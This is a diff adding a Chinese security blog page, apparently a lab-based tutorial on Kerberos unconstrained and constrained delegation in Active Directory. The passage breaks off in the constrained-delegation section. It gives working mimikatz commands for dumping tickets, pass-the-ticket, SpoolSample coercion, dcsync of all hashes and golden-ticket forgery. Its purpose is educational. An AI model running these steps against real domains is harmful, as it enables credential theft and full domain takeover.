@@ -1,0 +1,509 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>域渗透-约束委派与非约束委派 | ke1nys`Blog</title><meta name="author" content="ke1nys"><meta name="copyright" content="ke1nys"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考文章1  参考文章—xz社区 这个是在打春秋云镜的Certify的靶机的时候遇到的知识点  上一篇是写了RBCD  现在的话把其他两个补齐 (这里的话复现的话就直接搬别人的截图了  这里就不搭建环境复现了) 简介这里的话  怎么发现约束委派和非约束委派的用户和计算机就不写了 就写利用方式 原理说明 当服务账号或者主机被设置为非约束性委派时，其userAccountControl属性会包含TRU">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透-约束委派与非约束委派">
+<meta property="og:url" content="https://ke1nys.github.io/posts/bf224af2.html">
+<meta property="og:site_name" content="ke1nys&#96;Blog">
+<meta property="og:description" content="参考文章1  参考文章—xz社区 这个是在打春秋云镜的Certify的靶机的时候遇到的知识点  上一篇是写了RBCD  现在的话把其他两个补齐 (这里的话复现的话就直接搬别人的截图了  这里就不搭建环境复现了) 简介这里的话  怎么发现约束委派和非约束委派的用户和计算机就不写了 就写利用方式 原理说明 当服务账号或者主机被设置为非约束性委派时，其userAccountControl属性会包含TRU">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png">
+<meta property="article:published_time" content="2023-09-29T08:00:26.000Z">
+<meta property="article:modified_time" content="2023-09-30T09:46:47.731Z">
+<meta property="article:author" content="ke1nys">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><link rel="shortcut icon" href="/img/zhuzhu.png"><link rel="canonical" href="https://ke1nys.github.io/posts/bf224af2"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><meta name="msapplication-TileColor" content="#3b70fc"/><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/128.png"/><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"/><link rel="mask-icon" href="/img/siteicon/128.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '域渗透-约束委派与非约束委派',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-30 17:46:47'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/css/runtime/runtime.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ke1nys`Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">139</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">121</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ke1nys`Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">域渗透-约束委派与非约束委派</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-29T08:00:26.000Z" title="发表于 2023-09-29 16:00:26">2023-09-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-30T09:46:47.731Z" title="更新于 2023-09-30 17:46:47">2023-09-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="域渗透-约束委派与非约束委派"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7083788949482635271#heading-7">参考文章1</a>  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7217#toc-9">参考文章—xz社区</a></p>
+<p>这个是在打春秋云镜的Certify的靶机的时候遇到的知识点  上一篇是写了RBCD  现在的话把其他两个补齐</p>
+<p><strong>(这里的话复现的话就直接搬别人的截图了  这里就不搭建环境复现了)</strong></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这里的话  怎么发现约束委派和非约束委派的用户和计算机就不写了</p>
+<p>就写利用方式</p>
+<h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><ul>
+<li><p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>TRUSTED_FOR_DELEGATION</code></p>
+</li>
+<li><p>当服务账号或者主机被设置为约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且<code>msDS-AllowedToDelegateTo</code>属性会包含被约束的服务</p>
+</li>
+</ul>
+<p>发现域中委派的用户或计算机一般使用的手段是通过<code>LDAP</code>协议（全称：<code>LightweightDirectory Access Protocol</code>）然后通过<code>userAccountControl</code>属性筛选出符合的用户或计算机，我们可以通过<code>ADSI</code>（全称：<code>ActiveDirectory Service Interfaces Editor</code>）来编辑和修改LDAP，<code>adsiedit.msc</code>可以打开<code>ADSI</code>编辑器，打开之后我们找到一个设置了非约束委派的用户，可以看到<code>userAccountControl</code>属性包含了<code>TRUSTED_FOR_DELEGATION</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930153644543.png" alt="image-20230930153644543"></p>
+<p>然后我们再看一下约束委派的用户，同样它的<code>userAccountControl</code>属性包含了<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，但是它比非约束委派的用户多了一个<code>msDS-AllowedToDelegateTo</code>属性，里面包含了允许委派的服务</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930153759579.png" alt="image-20230930153759579"></p>
+<blockquote>
+<p>注意 ： 委派的用户只能是————————-主机用户和服务用户</p>
+</blockquote>
+<h2 id="为什么需要域委派"><a href="#为什么需要域委派" class="headerlink" title="为什么需要域委派"></a>为什么需要域委派</h2><p>为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：<br> 用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。</p>
+<h2 id="域委派流程"><a href="#域委派流程" class="headerlink" title="域委派流程"></a>域委派流程</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/fc96bf11139c4826a7b810c44799622btplv-k3u1fbpfcp-zoom-in-crop-mark1512000.awebp" alt="img"></p>
+<p> 一个域内普通用户jack通过Kerberos协议认证到前台WEB服务后，前台运行 WEB服务的服务账号websvc模拟(Impersonate)用户 jack，以Kerberos 协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中单跳或者多跳的Kerberos认证。</p>
+<ul>
+<li><p>域内用户 jack 以 Kerberos 方式认证后访问 Web 服务器;</p>
+</li>
+<li><p>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请;</p>
+</li>
+<li><p>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据 TGT;</p>
+</li>
+<li><p>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据ST;</p>
+</li>
+<li><p>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据 ST;</p>
+</li>
+<li><p>websvc收到的jack用户的授权票据ST后，可访问文件服务，完成多跳认证。</p>
+</li>
+</ul>
+<h2 id="委派类型"><a href="#委派类型" class="headerlink" title="委派类型"></a>委派类型</h2><p>一是<strong>非约束性委派(Unconstrained Delegation)</strong> ，服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户<strong>访问<code>任意服务</code></strong></p>
+<p>二是<strong>约束性委派(Constrained Delegation)</strong> ，即Kerberos的扩展协议 <code>S4U2Proxy</code>，服务账号只能获取某用户的ST，从而只能模拟用户<strong>访问特定的服务</strong></p>
+<h2 id="非约束委派的利用"><a href="#非约束委派的利用" class="headerlink" title="非约束委派的利用"></a>非约束委派的利用</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>非约束委派：当user访问service1时，如果service1的服务账号开启了<code>unconstrained delegation</code>（非约束委派），则当<code>user</code>访问<code>service1</code>时会将user的<code>TGT</code>发送给<code>service1</code>并保存在内存中以备下次重用，然后<code>service1</code> 就可以利用这张<code>TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了</p>
+<p>非约束委派的请求过程（图来自微软手册）：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930155439169.png" alt="image-20230930155439169"></p>
+<p>上图的Kerberos请求描述分为如下步骤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1. 用户向`KDC`发送`KRB_AS_REQ`消息请求可转发的`TGT1`。</span><br><span class="line"></span><br><span class="line">2. KDC在`KRB_AS_REP`消息中返回`TGT1`。</span><br><span class="line"></span><br><span class="line">3. 用户根据步骤2中的TGT1请求转发TGT2。</span><br><span class="line"></span><br><span class="line">4. KDC在KRB_TGS_REP消息中为user返回TGT2。</span><br><span class="line"></span><br><span class="line">5. 用户使用步骤2中返回的TGT1向KDC请求Service1的ST（Service Ticket）</span><br><span class="line"></span><br><span class="line">6. TGS在KRB_TGS_REP消息中返回给用户service1的ST。</span><br><span class="line"></span><br><span class="line">7. 用户发送KRB_AP_REQ消息请求Service1，KRB_AP_REQ消息中包含了TGT1和Service1的ST、TGT2、TGT2的SessionKey</span><br><span class="line"></span><br><span class="line">8. service1使用用户发送过来的的TGT2，并以KRB_TGS_REQ的形式将其发送到KDC，以用户的名义请求service2的ST。</span><br><span class="line"></span><br><span class="line">9. KDC在KRB_TGS_REP消息中返回service2到service1的ST，以及service1可以使用的sessionkey。ST将客户端标识为用户，而不是service1。</span><br><span class="line"></span><br><span class="line">10. service1通过KRB_AP_REQ以用户的名义向service2发出请求。</span><br><span class="line"></span><br><span class="line">11. service2响应service1的请求。</span><br><span class="line"></span><br><span class="line">12. 有了这个响应，service1就可以在步骤7中响应用户的请求。</span><br><span class="line"></span><br><span class="line">13. 这里的TGT转发委派机制没有限制service1使用的TGT2是来自哪个服务，所以service1可以以用户的名义向KDC索要任何其他服务的票证。</span><br><span class="line"></span><br><span class="line">14. KDC返回步骤13中请求的ST</span><br><span class="line"></span><br><span class="line">15-16. service1以用户的名义来请求其它服务</span><br></pre></td></tr></table></figure>
+<p><strong>注</strong>：<code>TGT1（forwardable TGT）</code>用于访问<code>Service1</code>，<code>TGT2（forwarded TGT）</code>用于访问<code>Service2</code></p>
+<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>操作环境：</p>
+<ul>
+<li>域：<code>qiyou.com</code></li>
+<li>域控：windows server 2008R2，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code></li>
+<li>域内主机：windows server 2008R2，主机名：<code>DM2008</code>，IP：<code>192.168.141.183</code>，用户：<code>qiyou</code></li>
+</ul>
+<p><strong>注</strong>：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的</p>
+<p>现在我们将<code>DM2008</code>这个主机用户设置为非约束委派</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930155737452.png" alt="image-20230930155737452"></p>
+<p>然后我们以<code>administrator</code>的身份通过<code>WinRM</code>服务远程连接<code>DM2008</code></p>
+<p><strong>注</strong>：常见的连接方式还有：MSSQL和IIS，不过我们这里为了方便演示就直接用WinRM了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930155754988.png" alt="image-20230930155754988"></p>
+<p>这个时候域管理员的TGT已经缓存在<code>DM2008</code>了，我们用mimikatz即可dump出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930155920433.png" alt="image-20230930155920433"></p>
+<p>可以看到<code>[0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</code>即为域管理<code>administrator</code>的TGT</p>
+<p>此时我们访问域控是被拒绝的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930155938080.png" alt="image-20230930155938080"></p>
+<p>然后通过ptt将TGT注入到当前会话中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure>
+<p>成功访问</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930160007761.png" alt="image-20230930160007761"></p>
+<p><strong>注意</strong>：访问域控要用主机名或者是<code>FQDN</code>，使用IP还是会提示<code>拒绝访问</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930160032710.png" alt="image-20230930160032710"></p>
+<p><strong>这里将域管理员的TGT票据注入到本机内存中后  那么我们就拥有了域管理员的权限了</strong></p>
+<p>如果想执行命令的话，我们可以用<code>WinRM</code>服务来远程连接域控服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName WIN-QFPHJSM1L7G</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>-ComputerName</code>指定主机名</li>
+<li>如果你WinRM服务端口改了的话，可以用<code>-Port</code>指定<code>WinRM</code>端口，默认是<code>5985</code></li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930160204322.png" alt="image-20230930160204322"></p>
+<p><strong>注</strong>：<code>Windows Server 2012</code>及以上默认是开启WinRM服务的，<code>Windows Server 2008 R2</code>需要<code>winrm quickconfig -q</code>来启动<code>WinRM</code>服务，还要注意一点就是这条命令运行后会自动添加防火墙策略，防火墙默认会放行5985端口的。<strong>(这里的话是给被控主机开启这个WinRM服务)</strong></p>
+<h3 id="非约束委派-Spooler打印机服务"><a href="#非约束委派-Spooler打印机服务" class="headerlink" title="非约束委派+Spooler打印机服务"></a>非约束委派+Spooler打印机服务</h3><p>如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。</p>
+<p>利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接，这个利用场景是<code>tifkin_</code>，<code>enigma0x3</code>和<code>harmj0y</code>在<code>DerbyCon 2018</code>提出的</p>
+<p>演讲PPT：<a target="_blank" rel="noopener" href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory">地址</a></p>
+<p>利用原理：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。</p>
+<p><strong>(这里的话重点看利用原理就行了    简单易懂)</strong></p>
+<p><strong>注</strong>：<code>Print Spooler</code>服务默认是自动运行的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930161150298.png" alt="image-20230930161150298"></p>
+<p><strong>(用自己电脑搜索就行了  是可以看到是默认开启的)</strong></p>
+<p>操作环境：</p>
+<ul>
+<li>域：<code>test.local</code></li>
+<li>域控：系统：<code>Windows server 2012R2</code>主机名：<code>DM2012</code>，ip：<code>192.168.141.134</code></li>
+<li>域内主机：系统：<code>windows 10</code>，主机名：<code>win10</code>，ip：<code>192.168.141.165</code></li>
+</ul>
+<p>这个实现了前提是：需要获取一台主机账户开启了非约束委派域内机器的权限</p>
+<p>我们给win10这个主机账户开启非约束委派</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930161254235.png" alt="image-20230930161254235"></p>
+<p><strong>注</strong>：是主机账户开启非约束委派，而不是服务用户</p>
+<p><code>tifkin_</code>在他的github上开源了POC：<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p>
+<p>向DM2012的<code>Spooler</code>服务发送请求，强制其访问win10进行身份验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe dm2012 win10</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930161332611.png" alt="image-20230930161332611"></p>
+<p>然后使用mimikatz.exe导出域管理员的TGT票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+<p>可以发现成功导出来自<code>DM2012$</code>的TGT</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930161430370.png" alt="image-20230930161430370"></p>
+<p>得到TGT之后，我们用ptt将票据注入到当前会话后，可以用<code>dcsync</code>导出域控中所有用户的hash，然后用<code>krbtgt</code>用户的hash生成黄金票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;862bdd]-2-0-60a10000-DM2012$@krbtgt-TEST.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /domain:test.local /all /csv</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930161514487.png" alt="image-20230930161514487"></p>
+<p>得到<code>krbtgt</code>用户的hash之后生成一张administrator的黄金票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-662417213-3583657854-423750704 /krbtgt:683545df56ea57b168d0ad090e209616 /ptt</span><br></pre></td></tr></table></figure>
+<p>成功以administrator的身份访问域控</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930161630690.png" alt="image-20230930161630690"></p>
+<p>执行命令可以用<code>WinRM</code>服务来远程连接域控</p>
+<h2 id="约束委派的利用"><a href="#约束委派的利用" class="headerlink" title="约束委派的利用"></a>约束委派的利用</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>由于非约束委派的不安全性，微软在<code>windows server 2003</code>中引入了约束委派，对Kerberos协议进行了拓展，引入了<code>S4U</code>，其中<code>S4U</code>支持两个子协议：<code>Service for User to Self (S4U2Self)</code>和 <code>Service for User to Proxy (S4U2proxy)</code>，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self</code>可以代表自身请求针对其自身的Kerberos服务票据(ST)；<code>S4U2proxy</code>可以以用户的名义请求其它服务的ST，约束委派就是限制了<code>S4U2proxy</code>扩展的范围。</p>
+<p><strong>约束委派（Constrained Delegation）即 Kerberos 的扩展协议 S4U2Proxy，服务账号只能获取某用户的 TGS ，从而只能模拟用户访问特定的服务，这也相对应非约束委派更安全一些。</strong></p>
+<ul>
+<li><code>S4U2self</code> (Service for User to S4U2Self) 可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个<strong>服务账户</strong>的 userAccountControl 标志为 <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>, 则其可以<strong>代表任何其他用户</strong>获取自身服务的 TGS/ST。</li>
